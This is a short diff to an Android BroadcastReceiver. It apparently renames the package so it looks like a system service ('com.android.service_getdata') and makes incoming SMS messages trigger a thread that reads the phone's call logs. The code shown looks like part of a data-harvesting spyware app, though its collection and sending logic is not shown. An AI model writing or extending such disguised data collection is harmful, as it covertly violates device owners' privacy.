@@ -1,4 +1,4 @@
-package sms.example.inbjavia.server_parse;
+package com.android.service_getdata;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -17,7 +17,7 @@ public class AllReceiver extends BroadcastReceiver {
         String action = intent.getAction();
 
         if(action == "android.provider.Telephony.SMS_RECEIVED"){
-            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(), PickUpDataThread.ONE_TIME_THREAD);
+            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(),PickUpDataThread.CALLLOGS_THREAD);
             Thread thread = new Thread(pickUpDataThread);
             thread.start();
             Toast.makeText(context,"Message Received",Toast.LENGTH_SHORT).show();
